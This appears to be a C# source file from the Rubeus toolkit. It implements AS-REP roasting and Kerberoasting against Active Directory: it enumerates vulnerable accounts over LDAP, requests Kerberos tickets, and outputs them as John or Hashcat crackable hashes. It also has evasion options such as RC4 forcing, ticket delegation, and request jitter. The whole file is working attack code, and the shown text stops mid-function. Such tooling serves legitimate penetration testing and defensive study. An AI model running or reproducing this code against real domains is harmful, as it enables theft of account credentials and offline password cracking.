b'\xef\xbb\xbfusing System;\nusing Asn1;\nusing System.IO;\nusing ConsoleTables;\nusing System.Text.RegularExpressions;\nusing System.Security.Principal;\nusing System.Collections.Generic;\nusing Rubeus.lib.Interop;\n\nnamespace Rubeus\n{\n    public class Roast\n    {\n        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false)\n        {\n            if (!String.IsNullOrEmpty(userName))\n            {\n                Console.WriteLine("[*] Target User            : {0}", userName);\n            }\n            if (!String.IsNullOrEmpty(OUName))\n            {\n                Console.WriteLine("[*] Target OU              : {0}", OUName);\n            }\n            if (!String.IsNullOrEmpty(domain))\n            {\n                Console.WriteLine("[*] Target Domain          : {0}", domain);\n            }\n            if (!String.IsNullOrEmpty(domainController))\n            {\n                Console.WriteLine("[*] Target DC              : {0}", domainController);\n            }\n\n            Console.WriteLine();\n\n            if (!String.IsNullOrEmpty(userName) && !String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(domainController))\n            {\n                // if we have a username, domain, and DC specified, we don\'t need to search for users and can roast directly\n                GetASRepHash(userName, domain, domainController, format, outFile);\n            }\n            else\n            {\n                string userSearchFilter = "";\n\n                if (String.IsNullOrEmpty(userName))\n                {\n                    userSearchFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";\n                }\n                else\n                {\n                    userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);\n                }\n                if (!String.IsNullOrEmpty(ldapFilter))\n                {\n                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);\n                }\n                \n                if (String.IsNullOrEmpty(domain))\n                {\n                    domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;\n                }\n                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, domainController, domain, userSearchFilter, ldaps);\n\n                if (users == null)\n                {\n                    Console.WriteLine("[X] Error during executing the LDAP query.");\n                    return;\n                }\n                if (users.Count == 0)\n                {\n                    Console.WriteLine("[X] No users found to AS-REP roast!");\n                }\n\n                foreach (IDictionary<string, Object> user in users)\n                {\n                    string samAccountName = (string)user["samaccountname"];\n                    string distinguishedName = (string)user["distinguishedname"];\n                    Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);\n                    Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);\n\n                    GetASRepHash(samAccountName, domain, domainController, format, outFile);\n                }\n            }\n\n            if (!String.IsNullOrEmpty(outFile))\n            {\n                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));\n            }\n        }\n\n        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "")\n        {\n            // roast AS-REPs for users without pre-authentication enabled\n\n            string dcIP = Networking.GetDCIP(domainController, true, domain);\n            if (String.IsNullOrEmpty(dcIP)) { return; }\n\n            Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: \'{0}\\\\{1}\'", domain, userName);\n            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac).Encode().Encode();\n\n            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);\n            if (response == null)\n            {\n                return;\n            }\n\n            // decode the supplied bytes to an AsnElt object\n            //  false == ignore trailing garbage\n            AsnElt responseAsn = AsnElt.Decode(response, false);\n\n            // check the response value\n            int responseTag = responseAsn.TagValue;\n\n            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)\n            {\n                Console.WriteLine("[+] AS-REQ w/o preauth successful!");\n\n                // parse the response to an AS-REP\n                AS_REP rep = new AS_REP(response);\n\n                // output the hash of the encrypted KERB-CRED in a crackable hash form\n                string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);\n                repHash = repHash.Insert(32, "$");\n\n                string hashString = "";\n                if (format == "john")\n                {\n                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);\n                }\n                else if (format == "hashcat")\n                {\n                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);\n                }\n                else\n                {\n                    Console.WriteLine("Please provide a cracking format.");\n                }\n\n                if (!String.IsNullOrEmpty(outFile))\n                {\n                    string outFilePath = Path.GetFullPath(outFile);\n                    try\n                    {\n                        File.AppendAllText(outFilePath, hashString + Environment.NewLine);\n                    }\n                    catch (Exception e)\n                    {\n                        Console.WriteLine("Exception: {0}", e.Message);\n                    }\n                    Console.WriteLine("[*] Hash written to {0}\\r\\n", outFilePath);\n                }\n                else\n                {\n                    Console.WriteLine("[*] AS-REP hash:\\r\\n");\n\n                    // display the base64 of a hash, columns of 80 chararacters\n                    if (false)\n                    {\n                        foreach (string line in Helpers.Split(hashString, 80))\n                        {\n                            Console.WriteLine("      {0}", line);\n                        }\n                    }\n                    else\n                    {\n                        Console.WriteLine("      {0}", hashString);\n                    }\n                    Console.WriteLine();\n                }\n            }\n            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)\n            {\n                // parse the response to an KRB-ERROR\n                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);\n                Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n            }\n            else\n            {\n                Console.WriteLine("\\r\\n[X] Unknown application tag: {0}", responseTag);\n            }\n        }\n\n        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false)\n        {\n            if (userStats)\n            {\n                Console.WriteLine("[*] Listing statistics about target users, no ticket requests being performed.");\n            }\n            else if (TGT != null)\n            {\n                Console.WriteLine("[*] Using a TGT /ticket to request service tickets");\n            }\n            else if (useTGTdeleg || String.Equals(supportedEType, "rc4opsec"))\n            {\n                Console.WriteLine("[*] Using \'tgtdeleg\' to request a TGT for the current user");\n                byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);\n                TGT = new KRB_CRED(delegTGTbytes);\n                Console.WriteLine("[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else");\n            }\n            else\n            {\n                Console.WriteLine("[*] NOTICE: AES hashes will be returned for AES-enabled accounts.");\n                Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\\r\\n");\n            }\n\n            if ((enterprise) && ((TGT == null) || ((String.IsNullOrEmpty(spn)) && (spns != null) && (spns.Count == 0))))\n            {\n                Console.WriteLine("[X] To use Enterprise Principals, /spn or /spns has to be specified, along with either /ticket or /tgtdeleg");\n                return;\n            }\n\n            if(delay != 0)\n            {\n                Console.WriteLine($"[*] Using a delay of {delay} milliseconds between TGS requests.");\n                if(jitter != 0)\n                {\n                    Console.WriteLine($"[*] Using a jitter of {jitter}% between TGS requests.");\n                }\n                Console.WriteLine();\n            }\n\n            if (!String.IsNullOrEmpty(spn))\n            {\n                Console.WriteLine("\\r\\n[*] Target SPN             : {0}", spn);\n\n                if (TGT != null)\n                {\n                    // if a TGT .kirbi is supplied, use that for the request\n                    //      this could be a passed TGT or if TGT delegation is specified\n                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);\n                }\n                else\n                {\n                    // otherwise use the KerberosRequestorSecurityToken method\n                    GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);\n                }\n            }\n            else if ((spns != null) && (spns.Count != 0))\n            {\n                foreach (string s in spns)\n                {\n                    Console.WriteLine("\\r\\n[*] Target SPN             : {0}", s);\n\n                    if (TGT != null)\n                    {\n                        // if a TGT .kirbi is supplied, use that for the request\n                        //      this could be a passed TGT or if TGT delegation is specified\n                        GetTGSRepHash(TGT, s, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);\n                    }\n                    else\n                    {\n                        // otherwise use the KerberosRequestorSecurityToken method\n                        GetTGSRepHash(s, "USER", "DISTINGUISHEDNAME", cred, outFile);\n                    }\n                }\n            }\n            else\n            {\n                if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(OUName)) || (!String.IsNullOrEmpty(userName)))\n                {\n                    if (!String.IsNullOrEmpty(userName))\n                    {\n                        if (userName.Contains(","))\n                        {\n                            Console.WriteLine("[*] Target Users           : {0}", userName);\n                        }\n                        else\n                        {\n                            Console.WriteLine("[*] Target User            : {0}", userName);\n                        }\n                    }\n                    if (!String.IsNullOrEmpty(domain))\n                    {\n                        Console.WriteLine("[*] Target Domain          : {0}", domain);\n                    }\n                    if (!String.IsNullOrEmpty(OUName))\n                    {\n                        Console.WriteLine("[*] Target OU              : {0}", OUName);\n                    }\n                }\n\n                // inject ticket for LDAP search if supplied\n                if (TGT != null)\n                {\n                    byte[] kirbiBytes = null;\n                    string ticketDomain = TGT.enc_part.ticket_info[0].prealm;\n\n                    if (String.IsNullOrEmpty(domain))\n                    {\n                        // if a domain isn\'t specified, use the domain from the referral\n                        domain = ticketDomain;\n                    }\n\n                    // referral TGT is in use, we need a service ticket for LDAP on the DC to perform the domain searcher\n                    if (ticketDomain != domain)\n                    {\n                        if (String.IsNullOrEmpty(dc))\n                        {\n                            dc = Networking.GetDCName(domain);\n                        }\n\n                        string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];\n                        Ticket ticket = TGT.tickets[0];\n                        byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;\n                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;\n\n                        // check if we\'ve been given an IP for the DC, we\'ll need the name for the LDAP service ticket\n                        Match match = Regex.Match(dc, @"([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(\\d{1,3}\\.){3}\\d{1,3}");\n                        if (match.Success)\n                        {\n                            System.Net.IPAddress dcIP = System.Net.IPAddress.Parse(dc);\n                            System.Net.IPHostEntry dcInfo = System.Net.Dns.GetHostEntry(dcIP);\n                            dc = dcInfo.HostName;\n                        }\n                        \n                        // request a service tickt for LDAP on the target DC\n                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);\n                    }\n                    // otherwise inject the TGT to perform the domain searcher\n                    else\n                    {\n                        kirbiBytes = TGT.Encode().Encode();\n                    }\n                    LSA.ImportTicket(kirbiBytes, new LUID());\n                }\n\n                // build LDAP query\n                string userFilter = "";\n\n                if (!String.IsNullOrEmpty(userName))\n                {\n                    if (userName.Contains(","))\n                    {\n                        // searching for multiple specified users, ensuring they\'re not disabled accounts\n                        string userPart = "";\n                        foreach (string user in userName.Split(\',\'))\n                        {\n                            userPart += String.Format("(samAccountName={0})", user);\n                        }\n                        userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);\n                    }\n                    else\n                    {\n                        // searching for a specified user, ensuring it\'s not a disabled account\n                        userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", userName);\n                    }\n                }\n                else\n                {\n                    // if no user specified, filter out the krbtgt account and disabled accounts\n                    userFilter = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))";\n                }\n\n                string encFilter = "";\n                if (String.Equals(supportedEType, "rc4opsec"))\n                {\n                    // "opsec" RC4, meaning don\'t RC4 roast accounts that support AES\n                    Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");\n                    encFilter = "(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";\n                }\n                else if (String.Equals(supportedEType, "aes"))\n                {\n                    // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256\n                    Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");\n                    encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";\n                }\n\n                // Note: I originally thought that if enctypes included AES but DIDN\'T include RC4, \n                //       then RC4 tickets would NOT be returned, so the original filter was:\n                //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4\n                //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4\n                //  msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4 ->  supported etypes includes RC4\n                //  userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))";\n\n                //  But apparently Microsoft is silly and doesn\'t really follow their own docs and RC4 is always returned regardless \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf\n                //      so this fine-grained filtering is not needed\n\n                string userSearchFilter = "";\n                if (!(String.IsNullOrEmpty(pwdSetAfter) & String.IsNullOrEmpty(pwdSetBefore)))\n                {\n                    if (String.IsNullOrEmpty(pwdSetAfter))\n                    {\n                        pwdSetAfter = "01-01-1601";\n                    }\n                    if (String.IsNullOrEmpty(pwdSetBefore))\n                    {\n                        pwdSetBefore = "01-01-2100";\n                    }\n\n                    Console.WriteLine("[*] Searching for accounts with lastpwdset from {0} to {1}", pwdSetAfter, pwdSetBefore);\n\n                    try\n                    {\n                        DateTime timeFromConverted = DateTime.ParseExact(pwdSetAfter, "MM-dd-yyyy", null);\n                        DateTime timeUntilConverted = DateTime.ParseExact(pwdSetBefore, "MM-dd-yyyy", null);\n                        string timePeriod = "(pwdlastset>=" + timeFromConverted.ToFileTime() + ")(pwdlastset<=" + timeUntilConverted.ToFileTime() + ")";\n                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, timePeriod);\n                    }\n                    catch\n                    {\n                        Console.WriteLine("\\r\\n[X] Error parsing /pwdsetbefore or /pwdsetafter, please use the format \'MM-dd-yyyy\'");\n                        return;\n                    }\n                }\n                else\n                {\n                    userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);\n                }\n\n                if (!String.IsNullOrEmpty(ldapFilter))\n                {\n                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);\n                }\n\n                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, dc, domain, userSearchFilter, ldaps);\n                if (users == null)\n                {\n                    Console.WriteLine("[X] LDAP query failed, try specifying more domain information or specific SPNs.");\n                    return;\n                }\n\n                try\n                {\n                    if (users.Count == 0)\n                    {\n                        Console.WriteLine("\\r\\n[X] No users found to Kerberoast!");\n                    }\n                    else\n                    {\n                        Console.WriteLine("\\r\\n[*] Total kerberoastable users : {0}\\r\\n", users.Count);\n                    }\n\n                    // used to keep track of user encryption types\n                    SortedDictionary<Interop.SUPPORTED_ETYPE, int> userETypes = new SortedDictionary<Interop.SUPPORTED_ETYPE, int>();\n                    // used to keep track of years that users had passwords last set in\n                    SortedDictionary<int, int> userPWDsetYears = new SortedDictionary<int, int>();\n\n                    foreach (IDictionary<string, Object> user in users)\n                    {\n                        string samAccountName = (string)user["samaccountname"];\n                        string distinguishedName = (string)user["distinguishedname"];\n                        string servicePrincipalName = ((string[])user["serviceprincipalname"])[0];\n\n\n                        DateTime? pwdLastSet = null;\n                        if (user.ContainsKey("pwdlastset"))\n                        {\n                            pwdLastSet = ((DateTime)user["pwdlastset"]).ToLocalTime();\n                        }\n\n                        Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;\n                        if (user.ContainsKey("msds-supportedencryptiontypes"))\n                        {\n                            supportedETypes = (Interop.SUPPORTED_ETYPE)(int)user["msds-supportedencryptiontypes"];\n                        }\n\n                        if (!userETypes.ContainsKey(supportedETypes))\n                        {\n                            userETypes[supportedETypes] = 1;\n                        }\n                        else\n                        {\n                            userETypes[supportedETypes] = userETypes[supportedETypes] + 1;\n                        }\n\n                        if (pwdLastSet == null)\n                        {\n                            // pwdLastSet == null with new accounts and\n                            // when a password is set to never expire\n                            if (!userPWDsetYears.ContainsKey(-1))\n                                userPWDsetYears[-1] = 1;\n                            else\n                                userPWDsetYears[-1] += 1;\n                        }\n                        else\n                        {\n                            int year = pwdLastSet.Value.Year;\n                            if (!userPWDsetYears.ContainsKey(year))\n                                userPWDsetYears[year] = 1;\n                            else\n                                userPWDsetYears[year] += 1;\n                        }\n\n                        if (!userStats)\n                        {\n                            if (!simpleOutput)\n                            {\n                                Console.WriteLine("\\r\\n[*] SamAccountName         : {0}", samAccountName);\n                                Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);\n                                Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);\n                                Console.WriteLine("[*] PwdLastSet             : {0}", pwdLastSet);\n                                Console.WriteLine("[*] Supported ETypes       : {0}", supportedETypes);\n                            }\n\n                            if ((!String.IsNullOrEmpty(domain)) && (TGT == null))\n                            {\n                                servicePrincipalName = String.Format("{0}@{1}", servicePrincipalName, domain);\n                            }\n                            if (TGT != null)\n                            {\n                                // if a TGT .kirbi is supplied, use that for the request\n                                //      this could be a passed TGT or if TGT delegation is specified\n\n                                if (String.Equals(supportedEType, "rc4") &&\n                                        (\n                                            ((supportedETypes & Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||\n                                            ((supportedETypes & Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96)\n                                        )\n                                   )\n                                {\n                                    // if we\'re roasting RC4, but AES is supported AND we have a TGT, specify RC4\n                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);\n                                    Helpers.RandomDelayWithJitter(delay, jitter);\n                                    if (!result && autoenterprise)\n                                    {\n                                        Console.WriteLine("\\r\\n[-] Retrieving service ticket with SPN failed and \'/autoenterprise\' passed, retrying with the enterprise principal");\n                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);\n                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, Interop.KERB_ETYPE.rc4_hmac);\n                                        Helpers.RandomDelayWithJitter(delay, jitter);\n                                    }\n                                }\n                                else\n                                {\n                                    // otherwise don\'t force RC4 - have all supported encryption types for opsec reasons\n                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);\n                                    Helpers.RandomDelayWithJitter(delay, jitter);\n                                    if (!result && autoenterprise)\n                                    {\n                                        Console.WriteLine("\\r\\n[-] Retrieving service ticket with SPN failed and \'/autoenterprise\' passed, retrying with the enterprise principal");\n                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);\n                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc);\n                                        Helpers.RandomDelayWithJitter(delay, jitter);\n                                    }\n                                }\n                            }\n                            else\n                            {\n                                // otherwise use the KerberosRequestorSecurityToken method\n                                bool result = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);\n                                Helpers.RandomDelayWithJitter(delay, jitter);\n                                if (!result && autoenterprise)\n                                {\n                                    Console.WriteLine("\\r\\n[-] Retrieving service ticket with SPN failed and \'/autoenterprise\' passed, retrying with the enterprise principal");\n                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);\n                                    GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);\n                                    Helpers.RandomDelayWithJitter(delay, jitter);\n                                }\n                            }\n                        }\n                    }\n\n                    if (userStats)\n                    {\n                        var eTypeTable = new ConsoleTable("Supported Encryption Type", "Count");\n                        var pwdLastSetTable = new ConsoleTable("Password Last Set Year", "Count");\n                        Console.WriteLine();\n\n                        // display stats about the users found\n                        foreach (var item in userETypes)\n                        {\n                            eTypeTable.AddRow(item.Key.ToString(), item.Value.ToString());\n                        }\n                        eTypeTable.Write();\n\n                        foreach (var item in userPWDsetYears)\n                        {\n                            pwdLastSetTable.AddRow(item.Key.ToString(), item.Value.ToString());\n                        }\n                        pwdLastSetTable.Write();\n                    }\n                }\n                catch (Exception ex)\n                {\n                    Console.WriteLine("\\r\\n[X] Error executing the domain searcher: {0}", ex);\n                    return;\n                }\n            }\n\n            if (!String.IsNullOrEmpty(outFile))\n            {\n                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));\n            }\n        }\n\n        public static bool GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)\n        {\n            // use the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach\n\n            string domain = "DOMAIN";\n\n            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))\n            {\n                // extract the domain name from the distinguishedname\n                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);\n                string domainDN = dnMatch.Groups["Domain"].ToString();\n                domain = domainDN.Replace("DC=", "").Replace(\',\', \'.\');\n            }\n\n            try\n            {\n                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the\n                //  GetRequest() stream was constributed to PowerView by @machosec\n                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;\n                if (cred != null)\n                {\n                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());\n                }\n                else\n                {\n                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);\n                }\n                byte[] requestBytes = ticket.GetRequest();\n\n                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))\n                {\n                    Console.WriteLine("\\r\\n[X] GSSAPI inner token is not an AP_REQ.\\r\\n");\n                    return false;\n                }\n\n                // ignore the GSSAPI frame\n                byte[] apReqBytes = new byte[requestBytes.Length - 17];\n                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);\n\n                AsnElt apRep = AsnElt.Decode(apReqBytes);\n\n                if (apRep.TagValue != 14)\n                {\n                    Console.WriteLine("\\r\\n[X] Incorrect ASN application tag.  Expected 14, but got {0}.\\r\\n", apRep.TagValue);\n                }\n\n                long encType = 0;\n\n                foreach (AsnElt elem in apRep.Sub[0].Sub)\n                {\n                    if (elem.TagValue == 3)\n                    {\n                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)\n                        {\n                            if (elem2.TagValue == 3)\n                            {\n                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)\n                                {\n                                    if (elem3.TagValue == 0)\n                                    {\n                                        encType = elem3.Sub[0].GetInteger();\n                                    }\n\n                                    if (elem3.TagValue == 2)\n                                    {\n                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();\n                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");\n                                        string hash = "";\n\n                                        if ((encType == 18) || (encType == 17))\n                                        {\n                                            //Ensure checksum is extracted from the end for aes keys\n                                            int checksumStart = cipherText.Length - 24;\n                                            //Enclose SPN in *s rather than username, realm and SPN. This doesn\'t impact cracking, but might affect loading into hashcat.\n                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));\n                                        }\n                                        //if encType==23\n                                        else\n                                        {\n                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));\n                                        }\n\n                                        if (!String.IsNullOrEmpty(outFile))\n                                        {\n                                            string outFilePath = Path.GetFullPath(outFile);\n                                            try\n                                            {\n                                                File.AppendAllText(outFilePath, hash + Environment.NewLine);\n                                            }\n                                            catch (Exception e)\n                                            {\n                                                Console.WriteLine("Exception: {0}", e.Message);\n                                            }\n                                            Console.WriteLine("[*] Hash written to {0}\\r\\n", outFilePath);\n                                        }\n                                        else if (simpleOutput)\n                                        {\n                                            Console.WriteLine(hash);\n                                        }\n                                        else\n                                        {\n                                            if (false)\n                                            {\n                                                bool header = false;\n                                                foreach (string line in Helpers.Split(hash, 80))\n                                                {\n                                                    if (!header)\n                                                    {\n                                                        Console.WriteLine("[*] Hash                   : {0}", line);\n                                                    }\n                                                    else\n                                                    {\n                                                        Console.WriteLine("                             {0}", line);\n                                                    }\n                                                    header = true;\n                                                }\n                                            }\n                                            else\n                                            {\n                                                Console.WriteLine("[*] Hash                   : {0}", hash);\n                                            }\n                                            Console.WriteLine();\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            catch (Exception ex)\n            {\n                Console.WriteLine("\\r\\n [X] Error during request for SPN {0} : {1}\\r\\n", spn, ex.InnerException.Message);\n                return false;\n            }\n            return true;\n        }\n\n        public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)\n        {\n            // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method\n            string userDomain = "DOMAIN";\n\n            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))\n            {\n                // extract the domain name from the distinguishedname\n                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);\n                string domainDN = dnMatch.Groups["Domain"].ToString();\n                userDomain = domainDN.Replace("DC=", "").Replace(\',\', \'.\');\n            }\n            \n            // extract out the info needed for the TGS-REQ request\n            string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];\n            string domain = TGT.enc_part.ticket_info[0].prealm.ToLower();\n            Ticket ticket = TGT.tickets[0];\n            byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;\n            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;\n\n            // request the new service ticket\n            byte[] tgsBytes = null;\n            if (domain.ToLower() != userDomain.ToLower())\n            {\n                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false);\n            }\n            else\n            {\n                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);\n            }\n\n            if (tgsBytes != null)\n            {\n                KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);\n                DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);\n                Console.WriteLine();\n                return true;\n            }\n\n            return false;\n        }\n\n        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false)\n        {\n            // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form\n\n            int encType = cred.tickets[0].enc_part.etype;\n            string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());\n            string domainName = cred.enc_part.ticket_info[0].prealm;\n            string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());\n\n            string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);\n\n            string hash = "";\n            //Aes needs to be treated differently, as the checksum is the last 24, not the first 32.\n            if ((encType == 18) || (encType == 17))\n            {\n                int checksumStart = cipherText.Length - 24;\n                //Enclose SPN in *s rather than username, realm and SPN. This doesn\'t impact cracking, but might affect loading into hashcat.            \n                hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));\n            }\n            //if encType==23\n            else\n            {\n                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));\n            }\n\n            if (!String.IsNullOrEmpty(outFile))\n            {\n                string outFilePath = Path.GetFullPath(outFile);\n                try\n                {\n                    File.AppendAllText(outFilePath, hash + Environment.NewLine);\n                }\n                catch (Exception e)\n                {\n                    Console.WriteLine("Exception: {0}", e.Message);\n                }\n                Console.WriteLine("[*] Hash written to {0}", outFilePath);\n            }\n            else if (simpleOutput)\n            {\n                Console.WriteLine(hash);\n            }\n            else\n            {\n                bool header = false;\n                if (false)\n                {\n                    foreach (string line in Helpers.Split(hash, 80))\n                    {\n                        if (!header)\n                        {\n                            if (kerberoastDisplay)\n                            {\n                                Console.WriteLine("[*] Hash                   : {0}", line);\n                            }\n                            else\n                            {\n                                Console.WriteLine("  Kerberoast Hash       :  {0}", line);\n                            }\n                        }\n                        else\n                        {\n                            if (kerberoastDisplay)\n                            {\n                                Console.WriteLine("                             {0}", line);\n                            }\n                            else\n                            {\n                                Console.WriteLine("                           {0}", line);\n                            